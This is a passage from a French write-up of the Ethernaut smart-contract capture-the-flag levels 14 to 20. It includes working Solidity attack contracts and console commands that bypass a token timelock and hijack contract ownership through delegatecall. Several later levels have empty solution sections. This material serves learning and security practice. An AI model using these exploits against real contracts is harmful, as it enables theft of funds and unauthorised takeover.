<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    <span class="nx">GatekeeperTwo</span> <span class="nx">object</span><span class="p">;</span>
    <span class="nx">bytes8</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">bytes8</span><span class="p">(</span><span class="o">~</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="k">this</span><span class="p">)))));</span>
    
    <span class="kd">constructor</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">object</span> <span class="o">=</span> <span class="nx">GatekeeperTwo</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">ret</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">object</span><span class="p">).</span><span class="nx">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s1">'enter(bytes8)'</span><span class="p">,</span> <span class="nx">key</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Way to go! Now that you can get past the gatekeeper, you have what it takes to join <a href="https://etherscan.io/address/thecyber.eth#code">theCyber</a>, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on <a href="https://www.reddit.com/user/0age">reddit</a> or via <a href="mailto:0age@protonmail.com">email</a> and use it to register with the contract at <a href="https://etherscan.io/address/gatekeepertwo.thecyber.eth#code">gatekeepertwo.thecyber.eth</a> (be aware that only the first 128 entrants will be accepted by the contract).</p>
</blockquote>

<hr />

<h2 id="15---naught-coin">15 - Naught Coin</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Réaliser un transfert vers un autre compte en appelant une fonction présente dans le contrat du quel on hérite.</p>
</blockquote>

<p>NaughtCoin is an ERC20 token and you’re already holding all of them.  The catch is that you’ll only be able to transfer them after a 10 year  lockout period. Can you figure out how to get them out to another  address so that you can transfer them freely? Complete this level by  getting your token balance to 0.</p>

<p>Things that might help</p>

<ul>
  <li>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li>
  <li>The <a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/token/ERC20/ERC20Detailed.sol'</span><span class="p">;</span>
<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/token/ERC20/ERC20.sol'</span><span class="p">;</span>

 <span class="nx">contract</span> <span class="nx">NaughtCoin</span> <span class="nx">is</span> <span class="nx">ERC20</span><span class="p">,</span> <span class="nx">ERC20Detailed</span> <span class="p">{</span>

  <span class="c1">// string public constant name = 'NaughtCoin';</span>
  <span class="c1">// string public constant symbol = '0x0';</span>
  <span class="c1">// uint public constant decimals = 18;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">timeLock</span> <span class="o">=</span> <span class="nx">now</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">365</span> <span class="nx">days</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">player</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_player</span><span class="p">)</span> 
  <span class="nx">ERC20Detailed</span><span class="p">(</span><span class="s1">'NaughtCoin'</span><span class="p">,</span> <span class="s1">'0x0'</span><span class="p">,</span> <span class="mi">18</span><span class="p">)</span>
  <span class="nx">ERC20</span><span class="p">()</span>
  <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">player</span> <span class="o">=</span> <span class="nx">_player</span><span class="p">;</span>
    <span class="nx">INITIAL_SUPPLY</span> <span class="o">=</span> <span class="mi">1000000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="nx">uint256</span><span class="p">(</span><span class="nx">decimals</span><span class="p">()));</span>
    <span class="c1">// _totalSupply = INITIAL_SUPPLY;</span>
    <span class="c1">// _balances[player] = INITIAL_SUPPLY;</span>
    <span class="nx">_mint</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
    <span class="nx">emit</span> <span class="nx">Transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_value</span><span class="p">)</span> <span class="nx">lockTokens</span> <span class="kr">public</span> <span class="nx">returns</span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">super</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">_to</span><span class="p">,</span> <span class="nx">_value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
  <span class="nx">modifier</span> <span class="nx">lockTokens</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">player</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">require</span><span class="p">(</span><span class="nx">now</span> <span class="o">&gt;</span> <span class="nx">timeLock</span><span class="p">);</span>
      <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
     <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> 
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-14">Analyse</h3>

<p>On peut voir que notre contrat hérite de <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20</a>. Nous héritons alors de toutes les fonctions que défini ce dernier. Notre but est de transférer les ethers de notre compte afin de le vider. Nous ne pouvons pas utiliser <code class="highlighter-rouge">transfert</code>() présent dans <code class="highlighter-rouge">NaughtCoin</code> car elle est protégée par le modifieur <code class="highlighter-rouge">lockTokens()</code>.</p>

<p>En cherchant un peu dans le code de ERC20 on tombe sur 2 fonctions intéressantes:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */</span>
    <span class="kd">function</span> <span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="nx">sender</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">recipient</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">virtual</span> <span class="nx">override</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_transfer</span><span class="p">(</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">recipient</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
        <span class="nx">_approve</span><span class="p">(</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">_msgSender</span><span class="p">(),</span> <span class="nx">_allowances</span><span class="p">[</span><span class="nx">sender</span><span class="p">][</span><span class="nx">_msgSender</span><span class="p">()].</span><span class="nx">sub</span><span class="p">(</span><span class="nx">amount</span><span class="p">,</span> <span class="s2">"ERC20: transfer amount exceeds allowance"</span><span class="p">));</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */</span>
    <span class="kd">function</span> <span class="nx">increaseAllowance</span><span class="p">(</span><span class="nx">address</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">addedValue</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">virtual</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_approve</span><span class="p">(</span><span class="nx">_msgSender</span><span class="p">(),</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">_allowances</span><span class="p">[</span><span class="nx">_msgSender</span><span class="p">()][</span><span class="nx">spender</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">addedValue</span><span class="p">));</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Nous allons commencer par appeler <code class="highlighter-rouge">increaseAllowance()</code> puis <code class="highlighter-rouge">transferFrom()</code> pour faire notre transfert.</p>

<h3 id="attaque-14">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">)).</span><span class="nx">toString</span><span class="p">()</span>
<span class="s2">"1000000000000000000000000"</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">increaseAllowance</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="s2">"1000000000000000000000000"</span><span class="p">)</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="s2">"0xc5aD6E105f37D4800071e679ec20780d04C93b41"</span><span class="p">,</span> <span class="s2">"1000000000000000000000000"</span><span class="p">)</span>

<span class="o">&gt;</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">)).</span><span class="nx">toString</span><span class="p">()</span>
<span class="s2">"0"</span>
</code></pre></div></div>

<blockquote>
  <p>When using code that’s not your own, it’s a good idea to familiarize  yourself with it to get a good understanding of how everything fits  together. This can be particularly important when there are multiple  levels of imports (your imports have imports) or when you are  implementing authorization controls, e.g. when you’re allowing or  disallowing people from doing things. In this example, a developer might scan through the code and think that <code class="highlighter-rouge">transfer</code> is the only  way to move tokens around, low and behold there are other ways of  performing the same operation with a different implementation.</p>
</blockquote>

<hr />

<h2 id="16---preservation">16 - Preservation</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Exploiter un <code class="highlighter-rouge">delegatecall</code> pour modifier le contexte de contrat (slot qui contient <code class="highlighter-rouge">owner</code>).</p>
</blockquote>

<p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>

<p>The goal of this level is for you to claim ownership of the instance you are given.</p>

<p>Things that might help</p>

<ul>
  <li>Look into Solidity’s documentation on the <code class="highlighter-rouge">delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
  <li>Understanding what it means for <code class="highlighter-rouge">delegatecall</code> to be context-preserving.</li>
  <li>Understanding how storage variables are stored and accessed.</li>
  <li>Understanding how casting works between different data types.</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Preservation</span> <span class="p">{</span>

  <span class="c1">// public library contracts </span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone1Library</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone2Library</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span> 
  <span class="nx">uint</span> <span class="nx">storedTime</span><span class="p">;</span>
  <span class="c1">// Sets the function signature for delegatecall</span>
  <span class="nx">bytes4</span> <span class="nx">constant</span> <span class="nx">setTimeSignature</span> <span class="o">=</span> <span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">"setTime(uint256)"</span><span class="p">));</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_timeZone1LibraryAddress</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_timeZone2LibraryAddress</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">timeZone1Library</span> <span class="o">=</span> <span class="nx">_timeZone1LibraryAddress</span><span class="p">;</span> 
    <span class="nx">timeZone2Library</span> <span class="o">=</span> <span class="nx">_timeZone2LibraryAddress</span><span class="p">;</span> 
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
 
  <span class="c1">// set the time for timezone 1</span>
  <span class="kd">function</span> <span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_timeStamp</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">timeZone1Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span> <span class="nx">_timeStamp</span><span class="p">));</span>
  <span class="p">}</span>

  <span class="c1">// set the time for timezone 2</span>
  <span class="kd">function</span> <span class="nx">setSecondTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_timeStamp</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">timeZone2Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span> <span class="nx">_timeStamp</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Simple library contract to set the time</span>
<span class="nx">contract</span> <span class="nx">LibraryContract</span> <span class="p">{</span>

  <span class="c1">// stores a timestamp </span>
  <span class="nx">uint</span> <span class="nx">storedTime</span><span class="p">;</span>  

  <span class="kd">function</span> <span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_time</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">storedTime</span> <span class="o">=</span> <span class="nx">_time</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-15">Analyse</h3>

<p>Nous devons devenir <code class="highlighter-rouge">owner</code> du smart contract. Le problème est que le contrat ne permet pas de faire ce changement à première vue.</p>

<p>On se rabat alors rapidement sur l’utilisation des <code class="highlighter-rouge">delegatecall()</code> utilisés par <code class="highlighter-rouge">setFirstTime()</code> et <code class="highlighter-rouge">setSecondTime()</code>. On peut voir que l’on fait un appel à <code class="highlighter-rouge">setTime(uint256)</code>.</p>

<blockquote>
  <p>There exists a special variant of a message call, named <strong>delegatecall</strong> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code class="highlighter-rouge">msg.sender</code> and <code class="highlighter-rouge">msg.value</code> do not change their values.</p>

  <p>This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.</p>

  <p>This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to  implement a complex data structure.</p>
</blockquote>

<p>Nous allons exploiter un appel à <code class="highlighter-rouge">delegateall()</code> qui nous permet de pouvoir modifier le contexte, donc les valeurs des slots du smart contract. Nous aurons simplement à créer une fonction dans notre smart contract qui possède la bonne signature.</p>

<p>Répartition dans les slots:</p>

<ul>
  <li>slot 0: <code class="highlighter-rouge">timeZone1Library</code></li>
  <li>slot 1: <code class="highlighter-rouge">timeZone2Library</code></li>
  <li>slot 2: <code class="highlighter-rouge">owner</code></li>
</ul>

<p>Nous devons modifier la valeur du slot 2.</p>

<h3 id="attaque-15">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">timeZone1Library</span><span class="p">()</span>
<span class="s2">"0x4f0c5F3bcc055b0f485F7e165B75B44e2b67f9D6"</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">timeZone2Library</span><span class="p">()</span>
<span class="s2">"0x388ba2Fa282334E76c5563d3AC2EfC33399580B9"</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
<span class="s2">"0xa47AFD98aBba00C731C08F470890dCF6e42d8f27"</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 0x271016E1fb59FeD5E01F1D42AF81153dD5E942ed</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">slot0</span><span class="p">;</span>
    <span class="nx">address</span> <span class="nx">slot1</span><span class="p">;</span>
    <span class="nx">address</span> <span class="nx">slot2</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_time</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">slot2</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// deploy Attack contract and use its address</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="s2">"0x271016E1fb59FeD5E01F1D42AF81153dD5E942ed"</span><span class="p">)</span>

<span class="c1">// recall</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="s2">"0"</span><span class="p">)</span>

<span class="c1">// we get owner !</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
<span class="s2">"0x1cee0B9d62488Fe1C57826245C1F1298B6637eC2"</span>
</code></pre></div></div>

<blockquote>
  <p>As the previous level, <code class="highlighter-rouge">delegate</code> mentions, the use of <code class="highlighter-rouge">delegatecall</code> to call libraries can be risky. This is particularly true for contract “libraries” that have their own state. This example demonstrates why the <code class="highlighter-rouge">library</code> keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.</p>
</blockquote>

<hr />

<h2 id="17---recovery">17 - Recovery</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>
</blockquote>

<p>A contract creator has built a very simple token factory contract.  Anyone can create new tokens with ease. After deploying the first token  contract, the creator sent <code class="highlighter-rouge">0.5</code> ether to obtain more tokens. They have since lost the contract address.</p>

<p>This level will be completed if you can recover (or remove) the <code class="highlighter-rouge">0.5</code> ether from the lost contract address.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Recovery</span> <span class="p">{</span>

  <span class="c1">//generate tokens</span>
  <span class="kd">function</span> <span class="nx">generateToken</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_name</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="k">new</span> <span class="nx">SimpleToken</span><span class="p">(</span><span class="nx">_name</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">_initialSupply</span><span class="p">);</span>
  
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">SimpleToken</span> <span class="p">{</span>

  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="c1">// public variables</span>
  <span class="nx">string</span> <span class="kr">public</span> <span class="nx">name</span><span class="p">;</span>
  <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>

  <span class="c1">// constructor</span>
  <span class="kd">constructor</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_name</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_creator</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">name</span> <span class="o">=</span> <span class="nx">_name</span><span class="p">;</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_creator</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_initialSupply</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// collect ether in return for tokens</span>
  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">mul</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// allow transfers of tokens</span>
  <span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">_amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span> 
    <span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">_amount</span><span class="p">);</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">].</span><span class="nx">sub</span><span class="p">(</span><span class="nx">_amount</span><span class="p">);</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_amount</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// clean up after ourselves</span>
  <span class="kd">function</span> <span class="nx">destroy</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">_to</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">_to</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-16">Analyse</h3>

<h3 id="attack">Attack</h3>

<hr />

<h2 id="18---magicnumber">18 - MagicNumber</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>
</blockquote>

<p>To solve this level, you only need to provide the Ethernaut with a  “Solver”, a contract that responds to “whatIsTheMeaningOfLife()” with  the right number.</p>

<p>Easy right? Well… there’s a catch.</p>

<p>The solver’s code needs to be really  tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty  tiny: 10 opcodes at most.</p>

<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>

<p>Good luck!</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">MagicNum</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">solver</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{}</span>

  <span class="kd">function</span> <span class="nx">setSolver</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_solver</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">solver</span> <span class="o">=</span> <span class="nx">_solver</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="cm">/*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-17">Analyse</h3>

<h3 id="attack-1">Attack</h3>

<hr />

<h2 id="19---alien-codex">19 - Alien Codex</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>
</blockquote>

<p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>

<p>Things that might help</p>

<ul>
  <li>Understanding how array storage works</li>
  <li>Understanding <a href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html">ABI specifications</a></li>
  <li>Using a very <code class="highlighter-rouge">underhanded</code> approach</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/ownership/Ownable.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">AlienCodex</span> <span class="nx">is</span> <span class="nx">Ownable</span> <span class="p">{</span>

  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">contact</span><span class="p">;</span>
  <span class="nx">bytes32</span><span class="p">[]</span> <span class="kr">public</span> <span class="nx">codex</span><span class="p">;</span>

  <span class="nx">modifier</span> <span class="nx">contacted</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">assert</span><span class="p">(</span><span class="nx">contact</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nx">make_contact</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">contact</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">record</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_content</span><span class="p">)</span> <span class="nx">contacted</span> <span class="kr">public</span> <span class="p">{</span>
  	<span class="nx">codex</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_content</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">retract</span><span class="p">()</span> <span class="nx">contacted</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">codex</span><span class="p">.</span><span class="nx">length</span><span class="o">--</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">revise</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">_content</span><span class="p">)</span> <span class="nx">contacted</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">codex</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_content</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-18">Analyse</h3>

<h3 id="attack-2">Attack</h3>

<hr />

<h2 id="20---denial">20 - Denial</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

